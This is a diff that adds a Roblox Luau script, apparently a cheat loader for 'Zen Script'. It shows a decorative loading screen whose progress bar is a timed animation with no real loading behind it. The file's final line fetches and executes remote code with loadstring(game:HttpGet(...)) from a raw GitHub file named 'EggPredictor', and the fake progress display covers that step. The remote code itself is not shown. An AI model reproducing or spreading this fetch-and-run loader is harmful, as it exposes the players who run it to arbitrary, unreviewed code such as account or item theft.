@@ -1,1 +1,154 @@
+-- Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Lighting = game:GetService("Lighting")
+
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+-- Add background blur
+local blur = Instance.new("BlurEffect")
+blur.Size = 24
+blur.Parent = Lighting
+
+-- ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "😈ZenScriptLoader😈"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = PlayerGui
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 400, 0, 150)
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
+mainFrame.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+local corner = Instance.new("UICorner", mainFrame)
+corner.CornerRadius = UDim.new(0, 12)
+
+-- Glow
+local glow = Instance.new("UIStroke", mainFrame)
+glow.Thickness = 2
+glow.Transparency = 0.4
+glow.Color = Color3.fromRGB(255, 0, 0)
+glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+-- Rainbow Borders
+local function createBorder(yPos)
+	local border = Instance.new("Frame")
+	border.Size = UDim2.new(1, 0, 0, 4)
+	border.Position = UDim2.new(0, 0, yPos, 0)
+	border.BackgroundColor3 = Color3.new(1, 0, 0)
+	border.BorderSizePixel = 0
+	border.Parent = mainFrame
+	return border
+end
+
+local topBorder = createBorder(0)
+local bottomBorder = createBorder(1)
+
+-- Loading Text
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1, 0, 0.25, 0)
+loadingText.Position = UDim2.new(0, 0, 0.05, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "😈Loading Zen Script...😈"
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.SourceSansBold
+loadingText.Parent = mainFrame
+
+-- Percentage Text
+local percentText = Instance.new("TextLabel")
+percentText.Size = UDim2.new(1, 0, 0.2, 0)
+percentText.Position = UDim2.new(0, 0, 0.32, 0)
+percentText.BackgroundTransparency = 1
+percentText.Text = "0%"
+percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentText.TextScaled = true
+percentText.Font = Enum.Font.SourceSans
+percentText.Parent = mainFrame
+
+-- Loading Bar Background
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0.9, 0, 0.2, 0)
+barBg.Position = UDim2.new(0.05, 0, 0.6, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+barBg.BorderSizePixel = 0
+barBg.Parent = mainFrame
+
+local barCorner = Instance.new("UICorner", barBg)
+barCorner.CornerRadius = UDim.new(0, 6)
+
+-- Loading Bar Fill
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+
+local barFillCorner = Instance.new("UICorner", barFill)
+barFillCorner.CornerRadius = UDim.new(0, 6)
+
+-- Animate rainbow borders
+local hue = 0
+RunService.RenderStepped:Connect(function()
+	hue = (hue + 0.005) % 1
+	local color = Color3.fromHSV(hue, 1, 1)
+	topBorder.BackgroundColor3 = color
+	bottomBorder.BackgroundColor3 = color
+	glow.Color = color
+end)
+
+-- Animate loading bar and percentage
+local duration = 10
+local startTime = tick()
+
+RunService.RenderStepped:Connect(function()
+	local elapsed = tick() - startTime
+	local progress = math.clamp(elapsed / duration, 0, 1)
+	barFill.Size = UDim2.new(progress, 0, 1, 0)
+	percentText.Text = tostring(math.floor(progress * 100)) .. "%"
+end)
+
+-- Tween bar fill to full over 10 seconds
+local loadingTween = TweenService:Create(barFill, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
+	Size = UDim2.new(1, 0, 1, 0)
+})
+loadingTween:Play()
+
+-- When done, fade out, remove blur, and execute
+loadingTween.Completed:Connect(function()
+	local fadeTween = TweenService:Create(mainFrame, TweenInfo.new(1), {
+		BackgroundTransparency = 1
+	})
+	local textFade1 = TweenService:Create(loadingText, TweenInfo.new(1), {
+		TextTransparency = 1
+	})
+	local textFade2 = TweenService:Create(percentText, TweenInfo.new(1), {
+		TextTransparency = 1
+	})
+	local barFade = TweenService:Create(barFill, TweenInfo.new(1), {
+		BackgroundTransparency = 1
+	})
+	
+	fadeTween:Play()
+	textFade1:Play()
+	textFade2:Play()
+	barFade:Play()
+
+	textFade1.Completed:Connect(function()
+		screenGui:Destroy()
+		if blur then blur:Destroy() end
+		-- Auto execute external script
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGardenVisual1/EggPredictor/refs/heads/main/text.txt"))()
+	end)
+end)
 
